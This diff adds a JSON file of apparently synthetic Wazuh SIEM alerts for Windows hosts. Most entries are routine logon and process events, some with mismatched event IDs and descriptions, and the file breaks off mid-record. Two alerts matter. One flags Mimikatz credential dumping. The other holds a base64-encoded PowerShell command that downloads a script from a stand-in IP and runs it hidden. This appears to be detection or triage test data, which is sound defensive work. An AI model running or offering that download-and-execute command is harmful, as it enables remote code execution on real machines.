@@ -1,0 +1,1100 @@
+[
+  {
+    "_index": "wazuh-alerts-4.x-2025.10.08",
+    "_id": "0e71683d-a123-4c95-b366-7dc9e99c6b04",
+    "_source": {
+      "agent": {
+        "name": "SCDC01",
+        "id": "005",
+        "ip": "172.16.200.50"
+      },
+      "rule": {
+        "level": 3,
+        "description": "A process was created.",
+        "id": "67027"
+      },
+      "data": {
+        "win": {
+          "system": {
+            "eventID": "4688",
+            "systemTime": "2025-10-08T18:07:31.023336Z",
+            "providerName": "Microsoft-Windows-Security-Auditing"
+          },
+          "eventdata": {
+            "subjectUserName": "Administrator",
+            "newProcessName": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
+            "parentProcessName": "C:\\Windows\\System32\\svchost.exe",
+            "targetLogonId": "0x0",
+            "subjectDomainName": "INSIGHTNEXUS",
+            "subjectLogonId": "0x37cfd"
+          }
+        }
+      },
+      "timestamp": "2025-10-08T17:47:47.023357Z",
+      "location": "EventChannel"
+    }
+  },
+  {
+    "_index": "wazuh-alerts-4.x-2025.10.08",
+    "_id": "cc9bd452-2f60-4e67-b10a-94a8c33d9120",
+    "_source": {
+      "agent": {
+        "name": "SCDC01",
+        "id": "005",
+        "ip": "172.16.200.50"
+      },
+      "rule": {
+        "level": 3,
+        "description": "A logon was successful.",
+        "id": "67027"
+      },
+      "data": {
+        "win": {
+          "system": {
+            "eventID": "4624",
+            "systemTime": "2025-10-08T17:37:29.023390Z",
+            "providerName": "Microsoft-Windows-Security-Auditing"
+          },
+          "eventdata": {
+            "subjectUserName": "Administrator",
+            "newProcessName": "C:\\Windows\\System32\\cmd.exe",
+            "parentProcessName": "C:\\Windows\\explorer.exe",
+            "targetLogonId": "0x0",
+            "subjectDomainName": "INSIGHTNEXUS",
+            "subjectLogonId": "0x48c5f"
+          }
+        }
+      },
+      "timestamp": "2025-10-08T17:51:39.023396Z",
+      "location": "EventChannel"
+    }
+  },
+  {
+    "_index": "wazuh-alerts-4.x-2025.10.08",
+    "_id": "f35ee477-6c1d-42e2-9e8b-b1c6e8d877f6",
+    "_source": {
+      "agent": {
+        "name": "SCDC01",
+        "id": "005",
+        "ip": "172.16.200.50"
+      },
+      "rule": {
+        "level": 3,
+        "description": "A logon was successful.",
+        "id": "67027"
+      },
+      "data": {
+        "win": {
+          "system": {
+            "eventID": "4624",
+            "systemTime": "2025-10-08T17:38:20.023417Z",
+            "providerName": "Microsoft-Windows-Security-Auditing"
+          },
+          "eventdata": {
+            "subjectUserName": "Administrator",
+            "newProcessName": "C:\\Windows\\System32\\cmd.exe",
+            "parentProcessName": "C:\\Windows\\explorer.exe",
+            "targetLogonId": "0x0",
+            "subjectDomainName": "INSIGHTNEXUS",
+            "subjectLogonId": "0xd2401"
+          }
+        }
+      },
+      "timestamp": "2025-10-08T17:49:00.023431Z",
+      "location": "EventChannel"
+    }
+  },
+  {
+    "_index": "wazuh-alerts-4.x-2025.10.08",
+    "_id": "ab7c4e8e-7dc8-4c76-8e28-c72715846f66",
+    "_source": {
+      "agent": {
+        "name": "SCDC01",
+        "id": "005",
+        "ip": "172.16.200.50"
+      },
+      "rule": {
+        "level": 3,
+        "description": "A logon was successful.",
+        "id": "67027"
+      },
+      "data": {
+        "win": {
+          "system": {
+            "eventID": "4689",
+            "systemTime": "2025-10-08T17:47:14.023452Z",
+            "providerName": "Microsoft-Windows-Security-Auditing"
+          },
+          "eventdata": {
+            "subjectUserName": "Administrator",
+            "newProcessName": "C:\\Windows\\System32\\cmd.exe",
+            "parentProcessName": "C:\\Windows\\explorer.exe",
+            "targetLogonId": "0x0",
+            "subjectDomainName": "INSIGHTNEXUS",
+            "subjectLogonId": "0xb255c"
+          }
+        }
+      },
+      "timestamp": "2025-10-08T17:42:38.023461Z",
+      "location": "EventChannel"
+    }
+  },
+  {
+    "_index": "wazuh-alerts-4.x-2025.10.08",
+    "_id": "86cd7c31-a22f-4318-a904-70a38c66bd46",
+    "_source": {
+      "agent": {
+        "name": "SCDC01",
+        "id": "005",
+        "ip": "172.16.200.50"
+      },
+      "rule": {
+        "level": 3,
+        "description": "A logon was successful.",
+        "id": "67027"
+      },
+      "data": {
+        "win": {
+          "system": {
+            "eventID": "4624",
+            "systemTime": "2025-10-08T18:12:05.023480Z",
+            "providerName": "Microsoft-Windows-Security-Auditing"
+          },
+          "eventdata": {
+            "subjectUserName": "Administrator",
+            "newProcessName": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
+            "parentProcessName": "C:\\Windows\\System32\\svchost.exe",
+            "targetLogonId": "0x0",
+            "subjectDomainName": "INSIGHTNEXUS",
+            "subjectLogonId": "0xaf1f3"
+          }
+        }
+      },
+      "timestamp": "2025-10-08T17:51:33.023485Z",
+      "location": "EventChannel"
+    }
+  },
+  {
+    "_index": "wazuh-alerts-4.x-2025.10.08",
+    "_id": "b648365f-86cd-4743-9705-48aefe7c6e72",
+    "_source": {
+      "agent": {
+        "name": "SCDC01",
+        "id": "005",
+        "ip": "172.16.200.50"
+      },
+      "rule": {
+        "level": 3,
+        "description": "A process was created.",
+        "id": "67027"
+      },
+      "data": {
+        "win": {
+          "system": {
+            "eventID": "4688",
+            "systemTime": "2025-10-08T17:48:21.023511Z",
+            "providerName": "Microsoft-Windows-Security-Auditing"
+          },
+          "eventdata": {
+            "subjectUserName": "Administrator",
+            "newProcessName": "C:\\Windows\\System32\\calc.exe",
+            "parentProcessName": "C:\\Windows\\explorer.exe",
+            "targetLogonId": "0x0",
+            "subjectDomainName": "INSIGHTNEXUS",
+            "subjectLogonId": "0x9bea1"
+          }
+        }
+      },
+      "timestamp": "2025-10-08T18:00:36.023516Z",
+      "location": "EventChannel"
+    }
+  },
+  {
+    "_index": "wazuh-alerts-4.x-2025.10.08",
+    "_id": "ed0ac017-7d08-4c24-b5c9-d386110aa22d",
+    "_source": {
+      "agent": {
+        "name": "SCDC01",
+        "id": "005",
+        "ip": "172.16.200.50"
+      },
+      "rule": {
+        "level": 3,
+        "description": "A logon was successful.",
+        "id": "67027"
+      },
+      "data": {
+        "win": {
+          "system": {
+            "eventID": "4624",
+            "systemTime": "2025-10-08T17:58:45.023534Z",
+            "providerName": "Microsoft-Windows-Security-Auditing"
+          },
+          "eventdata": {
+            "subjectUserName": "Administrator",
+            "newProcessName": "C:\\Windows\\System32\\cmd.exe",
+            "parentProcessName": "C:\\Windows\\explorer.exe",
+            "targetLogonId": "0x0",
+            "subjectDomainName": "INSIGHTNEXUS",
+            "subjectLogonId": "0x539e6"
+          }
+        }
+      },
+      "timestamp": "2025-10-08T18:21:05.023539Z",
+      "location": "EventChannel"
+    }
+  },
+  {
+    "_index": "wazuh-alerts-4.x-2025.10.08",
+    "_id": "61fb4e6b-dc8c-4505-97ef-ebc620bc5d93",
+    "_source": {
+      "agent": {
+        "name": "SCDC01",
+        "id": "005",
+        "ip": "172.16.200.50"
+      },
+      "rule": {
+        "level": 3,
+        "description": "A logon was successful.",
+        "id": "67027"
+      },
+      "data": {
+        "win": {
+          "system": {
+            "eventID": "4624",
+            "systemTime": "2025-10-08T17:31:45.023786Z",
+            "providerName": "Microsoft-Windows-Security-Auditing"
+          },
+          "eventdata": {
+            "subjectUserName": "Administrator",
+            "newProcessName": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
+            "parentProcessName": "C:\\Windows\\System32\\svchost.exe",
+            "targetLogonId": "0x0",
+            "subjectDomainName": "INSIGHTNEXUS",
+            "subjectLogonId": "0x38260"
+          }
+        }
+      },
+      "timestamp": "2025-10-08T18:22:55.023792Z",
+      "location": "EventChannel"
+    }
+  },
+  {
+    "_index": "wazuh-alerts-4.x-2025.10.08",
+    "_id": "66125021-4b7e-42f6-aa15-e4a501a9f3c6",
+    "_source": {
+      "agent": {
+        "name": "SCDC01",
+        "id": "005",
+        "ip": "172.16.200.50"
+      },
+      "rule": {
+        "level": 3,
+        "description": "A process was created.",
+        "id": "67027"
+      },
+      "data": {
+        "win": {
+          "system": {
+            "eventID": "4688",
+            "systemTime": "2025-10-08T18:03:03.023819Z",
+            "providerName": "Microsoft-Windows-Security-Auditing"
+          },
+          "eventdata": {
+            "subjectUserName": "Administrator",
+            "newProcessName": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
+            "parentProcessName": "C:\\Windows\\System32\\svchost.exe",
+            "targetLogonId": "0x0",
+            "subjectDomainName": "INSIGHTNEXUS",
+            "subjectLogonId": "0xf38bb"
+          }
+        }
+      },
+      "timestamp": "2025-10-08T17:30:00.023825Z",
+      "location": "EventChannel"
+    }
+  },
+  {
+    "_index": "wazuh-alerts-4.x-2025.10.08",
+    "_id": "7392e97f-c4cf-4c41-9b1b-bf03975bafb0",
+    "_source": {
+      "agent": {
+        "name": "SCDC01",
+        "id": "005",
+        "ip": "172.16.200.50"
+      },
+      "rule": {
+        "level": 3,
+        "description": "A logon was successful.",
+        "id": "67027"
+      },
+      "data": {
+        "win": {
+          "system": {
+            "eventID": "4624",
+            "systemTime": "2025-10-08T17:41:20.023844Z",
+            "providerName": "Microsoft-Windows-Security-Auditing"
+          },
+          "eventdata": {
+            "subjectUserName": "Administrator",
+            "newProcessName": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
+            "parentProcessName": "C:\\Windows\\System32\\svchost.exe",
+            "targetLogonId": "0x0",
+            "subjectDomainName": "INSIGHTNEXUS",
+            "subjectLogonId": "0xbeda1"
+          }
+        }
+      },
+      "timestamp": "2025-10-08T17:32:21.023849Z",
+      "location": "EventChannel"
+    }
+  },
+  {
+    "_index": "wazuh-alerts-4.x-2025.10.08",
+    "_id": "c8bace6f-8a8a-4dbf-80b8-990d04a2cd01",
+    "_source": {
+      "agent": {
+        "name": "SCDC01",
+        "id": "005",
+        "ip": "172.16.200.50"
+      },
+      "rule": {
+        "level": 3,
+        "description": "A process was created.",
+        "id": "67027"
+      },
+      "data": {
+        "win": {
+          "system": {
+            "eventID": "4688",
+            "systemTime": "2025-10-08T18:09:07.023871Z",
+            "providerName": "Microsoft-Windows-Security-Auditing"
+          },
+          "eventdata": {
+            "subjectUserName": "Administrator",
+            "newProcessName": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
+            "parentProcessName": "C:\\Windows\\System32\\svchost.exe",
+            "targetLogonId": "0x0",
+            "subjectDomainName": "INSIGHTNEXUS",
+            "subjectLogonId": "0x6b1cd"
+          }
+        }
+      },
+      "timestamp": "2025-10-08T17:58:45.023876Z",
+      "location": "EventChannel"
+    }
+  },
+  {
+    "_index": "wazuh-alerts-4.x-2025.10.08",
+    "_id": "d6f97498-1c9e-4f18-9d52-18858c5889a3",
+    "_source": {
+      "agent": {
+        "name": "SCDC01",
+        "id": "005",
+        "ip": "172.16.200.50"
+      },
+      "rule": {
+        "level": 3,
+        "description": "A process was created.",
+        "id": "67027"
+      },
+      "data": {
+        "win": {
+          "system": {
+            "eventID": "4688",
+            "systemTime": "2025-10-08T17:54:23.023894Z",
+            "providerName": "Microsoft-Windows-Security-Auditing"
+          },
+          "eventdata": {
+            "subjectUserName": "Administrator",
+            "newProcessName": "C:\\Windows\\System32\\calc.exe",
+            "parentProcessName": "C:\\Windows\\explorer.exe",
+            "targetLogonId": "0x0",
+            "subjectDomainName": "INSIGHTNEXUS",
+            "subjectLogonId": "0xedbd7"
+          }
+        }
+      },
+      "timestamp": "2025-10-08T17:58:35.023899Z",
+      "location": "EventChannel"
+    }
+  },
+  {
+    "_index": "wazuh-alerts-4.x-2025.10.08",
+    "_id": "388fb529-4179-44e1-bc11-d90371f1b9f7",
+    "_source": {
+      "agent": {
+        "name": "SCDC01",
+        "id": "005",
+        "ip": "172.16.200.50"
+      },
+      "rule": {
+        "level": 3,
+        "description": "A logon was successful.",
+        "id": "67027"
+      },
+      "data": {
+        "win": {
+          "system": {
+            "eventID": "4689",
+            "systemTime": "2025-10-08T17:48:18.023916Z",
+            "providerName": "Microsoft-Windows-Security-Auditing"
+          },
+          "eventdata": {
+            "subjectUserName": "Administrator",
+            "newProcessName": "C:\\Windows\\System32\\cmd.exe",
+            "parentProcessName": "C:\\Windows\\explorer.exe",
+            "targetLogonId": "0x0",
+            "subjectDomainName": "INSIGHTNEXUS",
+            "subjectLogonId": "0xc9a89"
+          }
+        }
+      },
+      "timestamp": "2025-10-08T18:22:16.023926Z",
+      "location": "EventChannel"
+    }
+  },
+  {
+    "_index": "wazuh-alerts-4.x-2025.10.08",
+    "_id": "9470b3ee-c870-45fd-b057-26a610ee2276",
+    "_source": {
+      "agent": {
+        "name": "SCDC01",
+        "id": "005",
+        "ip": "172.16.200.50"
+      },
+      "rule": {
+        "level": 3,
+        "description": "A logon was successful.",
+        "id": "67027"
+      },
+      "data": {
+        "win": {
+          "system": {
+            "eventID": "4624",
+            "systemTime": "2025-10-08T17:37:38.023959Z",
+            "providerName": "Microsoft-Windows-Security-Auditing"
+          },
+          "eventdata": {
+            "subjectUserName": "Administrator",
+            "newProcessName": "C:\\Windows\\System32\\notepad.exe",
+            "parentProcessName": "C:\\Windows\\explorer.exe",
+            "targetLogonId": "0x0",
+            "subjectDomainName": "INSIGHTNEXUS",
+            "subjectLogonId": "0xd2247"
+          }
+        }
+      },
+      "timestamp": "2025-10-08T18:02:47.023972Z",
+      "location": "EventChannel"
+    }
+  },
+  {
+    "_index": "wazuh-alerts-4.x-2025.10.08",
+    "_id": "2269214c-722f-4e0b-b319-f0ed7c0b2bcf",
+    "_source": {
+      "agent": {
+        "name": "SCDC01",
+        "id": "005",
+        "ip": "172.16.200.50"
+      },
+      "rule": {
+        "level": 3,
+        "description": "A logon was successful.",
+        "id": "67027"
+      },
+      "data": {
+        "win": {
+          "system": {
+            "eventID": "4624",
+            "systemTime": "2025-10-08T17:33:39.023999Z",
+            "providerName": "Microsoft-Windows-Security-Auditing"
+          },
+          "eventdata": {
+            "subjectUserName": "Administrator",
+            "newProcessName": "C:\\Windows\\System32\\calc.exe",
+            "parentProcessName": "C:\\Windows\\explorer.exe",
+            "targetLogonId": "0x0",
+            "subjectDomainName": "INSIGHTNEXUS",
+            "subjectLogonId": "0xd6c39"
+          }
+        }
+      },
+      "timestamp": "2025-10-08T17:38:37.024007Z",
+      "location": "EventChannel"
+    }
+  },
+  {
+    "_index": "wazuh-alerts-4.x-2025.10.08",
+    "_id": "061db33f-cf12-4ecb-bf5c-1b932a404e32",
+    "_source": {
+      "agent": {
+        "name": "SCDC01",
+        "id": "005",
+        "ip": "172.16.200.50"
+      },
+      "rule": {
+        "level": 3,
+        "description": "A logon was successful.",
+        "id": "67027"
+      },
+      "data": {
+        "win": {
+          "system": {
+            "eventID": "4689",
+            "systemTime": "2025-10-08T18:04:34.024041Z",
+            "providerName": "Microsoft-Windows-Security-Auditing"
+          },
+          "eventdata": {
+            "subjectUserName": "Administrator",
+            "newProcessName": "C:\\Windows\\System32\\notepad.exe",
+            "parentProcessName": "C:\\Windows\\explorer.exe",
+            "targetLogonId": "0x0",
+            "subjectDomainName": "INSIGHTNEXUS",
+            "subjectLogonId": "0x49512"
+          }
+        }
+      },
+      "timestamp": "2025-10-08T17:53:35.024049Z",
+      "location": "EventChannel"
+    }
+  },
+  {
+    "_index": "wazuh-alerts-4.x-2025.10.08",
+    "_id": "318211be-7f9f-41bc-b920-81c50ef7c862",
+    "_source": {
+      "agent": {
+        "name": "SCDC01",
+        "id": "005",
+        "ip": "172.16.200.50"
+      },
+      "rule": {
+        "level": 3,
+        "description": "A logon was successful.",
+        "id": "67027"
+      },
+      "data": {
+        "win": {
+          "system": {
+            "eventID": "4689",
+            "systemTime": "2025-10-08T18:02:59.024103Z",
+            "providerName": "Microsoft-Windows-Security-Auditing"
+          },
+          "eventdata": {
+            "subjectUserName": "Administrator",
+            "newProcessName": "C:\\Windows\\System32\\notepad.exe",
+            "parentProcessName": "C:\\Windows\\explorer.exe",
+            "targetLogonId": "0x0",
+            "subjectDomainName": "INSIGHTNEXUS",
+            "subjectLogonId": "0x9419a"
+          }
+        }
+      },
+      "timestamp": "2025-10-08T17:52:10.024118Z",
+      "location": "EventChannel"
+    }
+  },
+  {
+    "_index": "wazuh-alerts-4.x-2025.10.08",
+    "_id": "bfad18e8-5637-4438-88d2-6569a8e360ee",
+    "_source": {
+      "agent": {
+        "name": "SCDC01",
+        "id": "005",
+        "ip": "172.16.200.50"
+      },
+      "rule": {
+        "level": 3,
+        "description": "A logon was successful.",
+        "id": "67027"
+      },
+      "data": {
+        "win": {
+          "system": {
+            "eventID": "4689",
+            "systemTime": "2025-10-08T18:24:32.024161Z",
+            "providerName": "Microsoft-Windows-Security-Auditing"
+          },
+          "eventdata": {
+            "subjectUserName": "Administrator",
+            "newProcessName": "C:\\Windows\\System32\\cmd.exe",
+            "parentProcessName": "C:\\Windows\\explorer.exe",
+            "targetLogonId": "0x0",
+            "subjectDomainName": "INSIGHTNEXUS",
+            "subjectLogonId": "0x78570"
+          }
+        }
+      },
+      "timestamp": "2025-10-08T18:25:55.024169Z",
+      "location": "EventChannel"
+    }
+  },
+  {
+    "_index": "wazuh-alerts-4.x-2025.10.08",
+    "_id": "d96e427a-7749-4770-a5ea-86bf627ff90b",
+    "_source": {
+      "agent": {
+        "name": "SCDC01",
+        "id": "005",
+        "ip": "172.16.200.50"
+      },
+      "rule": {
+        "level": 3,
+        "description": "A logon was successful.",
+        "id": "67027"
+      },
+      "data": {
+        "win": {
+          "system": {
+            "eventID": "4689",
+            "systemTime": "2025-10-08T18:01:29.024209Z",
+            "providerName": "Microsoft-Windows-Security-Auditing"
+          },
+          "eventdata": {
+            "subjectUserName": "Administrator",
+            "newProcessName": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
+            "parentProcessName": "C:\\Windows\\System32\\svchost.exe",
+            "targetLogonId": "0x0",
+            "subjectDomainName": "INSIGHTNEXUS",
+            "subjectLogonId": "0xaf7fc"
+          }
+        }
+      },
+      "timestamp": "2025-10-08T17:30:41.024217Z",
+      "location": "EventChannel"
+    }
+  },
+  {
+    "_index": "wazuh-alerts-4.x-2025.10.08",
+    "_id": "45494650-c409-40e0-abc0-b4d29669943d",
+    "_source": {
+      "agent": {
+        "name": "SCDC01",
+        "id": "005",
+        "ip": "172.16.200.50"
+      },
+      "rule": {
+        "level": 3,
+        "description": "A logon was successful.",
+        "id": "67027"
+      },
+      "data": {
+        "win": {
+          "system": {
+            "eventID": "4689",
+            "systemTime": "2025-10-08T18:20:11.024247Z",
+            "providerName": "Microsoft-Windows-Security-Auditing"
+          },
+          "eventdata": {
+            "subjectUserName": "Administrator",
+            "newProcessName": "C:\\Windows\\System32\\calc.exe",
+            "parentProcessName": "C:\\Windows\\explorer.exe",
+            "targetLogonId": "0x0",
+            "subjectDomainName": "INSIGHTNEXUS",
+            "subjectLogonId": "0xd096b"
+          }
+        }
+      },
+      "timestamp": "2025-10-08T17:59:23.024255Z",
+      "location": "EventChannel"
+    }
+  },
+  {
+    "_index": "wazuh-alerts-4.x-2025.10.08",
+    "_id": "66324dd2-6652-4bd8-b07e-548977f19600",
+    "_source": {
+      "agent": {
+        "name": "SCDC01",
+        "id": "005",
+        "ip": "172.16.200.50"
+      },
+      "rule": {
+        "level": 3,
+        "description": "A logon was successful.",
+        "id": "67027"
+      },
+      "data": {
+        "win": {
+          "system": {
+            "eventID": "4624",
+            "systemTime": "2025-10-08T17:53:48.024295Z",
+            "providerName": "Microsoft-Windows-Security-Auditing"
+          },
+          "eventdata": {
+            "subjectUserName": "Administrator",
+            "newProcessName": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
+            "parentProcessName": "C:\\Windows\\System32\\svchost.exe",
+            "targetLogonId": "0x0",
+            "subjectDomainName": "INSIGHTNEXUS",
+            "subjectLogonId": "0x47a4b"
+          }
+        }
+      },
+      "timestamp": "2025-10-08T17:53:59.024303Z",
+      "location": "EventChannel"
+    }
+  },
+  {
+    "_index": "wazuh-alerts-4.x-2025.10.08",
+    "_id": "923924e8-7281-4ad3-97ed-6168ae4fdd72",
+    "_source": {
+      "agent": {
+        "name": "SCDC01",
+        "id": "005",
+        "ip": "172.16.200.50"
+      },
+      "rule": {
+        "level": 3,
+        "description": "A process was created.",
+        "id": "67027"
+      },
+      "data": {
+        "win": {
+          "system": {
+            "eventID": "4688",
+            "systemTime": "2025-10-08T17:54:05.024331Z",
+            "providerName": "Microsoft-Windows-Security-Auditing"
+          },
+          "eventdata": {
+            "subjectUserName": "Administrator",
+            "newProcessName": "C:\\Windows\\System32\\calc.exe",
+            "parentProcessName": "C:\\Windows\\explorer.exe",
+            "targetLogonId": "0x0",
+            "subjectDomainName": "INSIGHTNEXUS",
+            "subjectLogonId": "0x3c17f"
+          }
+        }
+      },
+      "timestamp": "2025-10-08T17:52:22.024340Z",
+      "location": "EventChannel"
+    }
+  },
+  {
+    "_index": "wazuh-alerts-4.x-2025.10.08",
+    "_id": "14bf23e0-5782-442d-985d-a0c0b2da445c",
+    "_source": {
+      "agent": {
+        "name": "SCDC01",
+        "id": "005",
+        "ip": "172.16.200.50"
+      },
+      "rule": {
+        "level": 3,
+        "description": "A logon was successful.",
+        "id": "67027"
+      },
+      "data": {
+        "win": {
+          "system": {
+            "eventID": "4624",
+            "systemTime": "2025-10-08T17:53:53.024378Z",
+            "providerName": "Microsoft-Windows-Security-Auditing"
+          },
+          "eventdata": {
+            "subjectUserName": "Administrator",
+            "newProcessName": "C:\\Windows\\System32\\notepad.exe",
+            "parentProcessName": "C:\\Windows\\explorer.exe",
+            "targetLogonId": "0x0",
+            "subjectDomainName": "INSIGHTNEXUS",
+            "subjectLogonId": "0x454d3"
+          }
+        }
+      },
+      "timestamp": "2025-10-08T17:54:35.024386Z",
+      "location": "EventChannel"
+    }
+  },
+  {
+    "_index": "wazuh-alerts-4.x-2025.10.08",
+    "_id": "c00e009d-d55b-4347-ac9d-12373aa88f1f",
+    "_source": {
+      "agent": {
+        "name": "SCDC01",
+        "id": "005",
+        "ip": "172.16.200.50"
+      },
+      "rule": {
+        "level": 3,
+        "description": "A logon was successful.",
+        "id": "67027"
+      },
+      "data": {
+        "win": {
+          "system": {
+            "eventID": "4624",
+            "systemTime": "2025-10-08T17:53:03.024436Z",
+            "providerName": "Microsoft-Windows-Security-Auditing"
+          },
+          "eventdata": {
+            "subjectUserName": "Administrator",
+            "newProcessName": "C:\\Windows\\System32\\cmd.exe",
+            "parentProcessName": "C:\\Windows\\explorer.exe",
+            "targetLogonId": "0x0",
+            "subjectDomainName": "INSIGHTNEXUS",
+            "subjectLogonId": "0x42ed5"
+          }
+        }
+      },
+      "timestamp": "2025-10-08T17:47:04.024443Z",
+      "location": "EventChannel"
+    }
+  },
+  {
+    "_index": "wazuh-alerts-4.x-2025.10.08",
+    "_id": "05bf8773-5156-4d50-8fd5-8884bf0537ce",
+    "_source": {
+      "agent": {
+        "name": "SCDC01",
+        "id": "005",
+        "ip": "172.16.200.50"
+      },
+      "rule": {
+        "level": 3,
+        "description": "A logon was successful.",
+        "id": "67027"
+      },
+      "data": {
+        "win": {
+          "system": {
+            "eventID": "4624",
+            "systemTime": "2025-10-08T18:02:33.024464Z",
+            "providerName": "Microsoft-Windows-Security-Auditing"
+          },
+          "eventdata": {
+            "subjectUserName": "Administrator",
+            "newProcessName": "C:\\Windows\\System32\\notepad.exe",
+            "parentProcessName": "C:\\Windows\\explorer.exe",
+            "targetLogonId": "0x0",
+            "subjectDomainName": "INSIGHTNEXUS",
+            "subjectLogonId": "0x610c3"
+          }
+        }
+      },
+      "timestamp": "2025-10-08T18:28:15.024470Z",
+      "location": "EventChannel"
+    }
+  },
+  {
+    "_index": "wazuh-alerts-4.x-2025.10.08",
+    "_id": "a7645c5f-8615-4498-a5c1-56c333a375ed",
+    "_source": {
+      "agent": {
+        "name": "SCDC01",
+        "id": "005",
+        "ip": "172.16.200.50"
+      },
+      "rule": {
+        "level": 3,
+        "description": "A logon was successful.",
+        "id": "67027"
+      },
+      "data": {
+        "win": {
+          "system": {
+            "eventID": "4689",
+            "systemTime": "2025-10-08T17:31:28.024488Z",
+            "providerName": "Microsoft-Windows-Security-Auditing"
+          },
+          "eventdata": {
+            "subjectUserName": "Administrator",
+            "newProcessName": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
+            "parentProcessName": "C:\\Windows\\System32\\svchost.exe",
+            "targetLogonId": "0x0",
+            "subjectDomainName": "INSIGHTNEXUS",
+            "subjectLogonId": "0xacea0"
+          }
+        }
+      },
+      "timestamp": "2025-10-08T18:12:48.024492Z",
+      "location": "EventChannel"
+    }
+  },
+  {
+    "_index": "wazuh-alerts-4.x-2025.10.08",
+    "_id": "37b43c27-e12b-4132-983a-b39afadf8219",
+    "_source": {
+      "agent": {
+        "name": "SCDC01",
+        "id": "005",
+        "ip": "172.16.200.50"
+      },
+      "rule": {
+        "level": 3,
+        "description": "A logon was successful.",
+        "id": "67027"
+      },
+      "data": {
+        "win": {
+          "system": {
+            "eventID": "4624",
+            "systemTime": "2025-10-08T17:59:32.024517Z",
+            "providerName": "Microsoft-Windows-Security-Auditing"
+          },
+          "eventdata": {
+            "subjectUserName": "Administrator",
+            "newProcessName": "C:\\Windows\\System32\\notepad.exe",
+            "parentProcessName": "C:\\Windows\\explorer.exe",
+            "targetLogonId": "0x0",
+            "subjectDomainName": "INSIGHTNEXUS",
+            "subjectLogonId": "0x913fc"
+          }
+        }
+      },
+      "timestamp": "2025-10-08T18:12:02.024527Z",
+      "location": "EventChannel"
+    }
+  },
+  {
+    "_index": "wazuh-alerts-4.x-2025.10.08",
+    "_id": "fb7c7e24-2044-4018-ba35-47dad0717533",
+    "_source": {
+      "agent": {
+        "name": "SCDC01",
+        "id": "005",
+        "ip": "172.16.200.50"
+      },
+      "rule": {
+        "level": 10,
+        "description": "Possible credential dumping detected (Mimikatz execution)",
+        "id": "92111",
+        "groups": [
+          "windows",
+          "sysmon",
+          "credential_access"
+        ]
+      },
+      "data": {
+        "win": {
+          "system": {
+            "eventID": "4688",
+            "systemTime": "2025-10-08T18:02:53.024615Z",
+            "providerName": "Microsoft-Windows-Security-Auditing"
+          },
+          "eventdata": {
+            "subjectUserName": "Administrator",
+            "newProcessName": "C:\\\\Users\\\\Administrator\\\\Downloads\\\\mimikatz.exe",
+            "parentProcessName": "C:\\\\Program Files\\\\Mozilla Firefox\\\\firefox.exe",
+            "subjectDomainName": "INSIGHTNEXUS",
+            "subjectLogonId": "0x457a5240"
+          }
+        }
+      },
+      "timestamp": "2025-10-08T18:25:36.024629Z",
+      "location": "EventChannel"
+    }
+  },
+  {
+    "_index": "wazuh-alerts-4.x-2025.10.08",
+    "_id": "d4f8a9c2-6b3e-4f12-9c2a-1e8f9b2a7c5d",
+    "_source": {
+      "agent": {
+        "name": "VICTIM-HOST-01.corp.local",
+        "id": "vh01",
+        "ip": "10.10.5.23"
+      },
+      "rule": {
+        "level": 12,
+        "description": "Suspicious PowerShell execution with EncodedCommand (possible downloader/obfuscation)",
+        "id": "34012",
+        "groups": [
+          "windows",
+          "sysmon",
+          "execution",
+          "obfuscation"
+        ]
+      },
+      "data": {
+        "win": {
+          "system": {
+            "eventID": "1",
+            "systemTime": "2025-10-08T10:12:30.123Z",
+            "providerName": "Microsoft-Windows-Sysmon"
+          },
+          "eventdata": {
+            "ProcessGuid": "{e9b2a6d2-9f0c-4b3d-91a4-1f2d3e5a6b7c}",
+            "ProcessId": "5420",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "-NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SUVYIChOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovLzE5OC41MS4xMDAuMjQvZGVmZW5kZXIvZGVwbG95LWRlZmluaXRpb25zLnBzMScpOyBTdGFydC1Qcm9jZXNzIHBvd2Vyc2hlbGwgLUFyZ3VtZW50TGlzdCAnLU5vUHJvZmlsZSAtV2luZG93U3R5bGUgSGlkZGVuIC1GaWxlIEM6XFdpbmRvd3NcVGVtcFxkZXBsb3ktZGVmaW5pdGlvbnMucHMxJw==",
+            "ParentProcessId": "668",
+            "ParentImage": "C:\\Windows\\system32\\services.exe",
+            "Hashes": "SHA256=3f6b2c5ea1b9f8d2a4b7c8d9e0f4a6b2c5e3d4a6b7c8e9f0a1b2c3d4e5f6a7b8",
+            "User": "CORP\\svc-update",
+            "Details": "EncodedCommand present; suspicious flags: -EncodedCommand, -ExecutionPolicy Bypass, -WindowStyle Hidden"
+          }
+        }
+      },
+      "timestamp": "2025-10-08T10:12:30.123Z",
+      "location": "Sysmon"
+    }
+  },
+  {
+    "_index": "wazuh-alerts-4.x-2025.10.08",
+    "_id": "8d7d67e4-40a8-44b0-b39d-2c5544b4d741",
+    "_source": {
+      "agent": {
+        "name": "SCDC01",
+        "id": "005",
+        "ip": "172.16.200.50"
+      },
+      "rule": {
+        "level": 3,
+        "description": "A logon was successful.",
+        "id": "67027"
+      },
+      "data": {
+        "win": {
+          "system": {
+            "eventID": "4689",
+            "systemTime": "2025-10-08T17:53:48.024550Z",
+            "providerName": "Microsoft-Windows-Security-Auditing"
+          },
+          "eventdata": {
+            "subjectUserName": "Administrator",
+            "newProcessName": "C:\\Windows\\System32\\cmd.exe",
+            "parentProcessName": "C:\\Windows\\explorer.exe",
+            "targetLogonId": "0x0",
+            "subjectDomainName": "INSIGHTNEXUS",
+            "subjectLogonId": "0x6aad4"
+          }
+        }
+      },
+      "timestamp": "2025-10-08T17:44:28.024555Z",
+      "location": "EventChannel"
+    }
+  },
+  {
+    "_index": "wazuh-alerts-4.x-2025.10.08",
+    "_id": "5624f5cf-9a75-4610-9acc-b00203855297",
+    "_source": {
+      "agent": {
+        "name": "SCDC01",
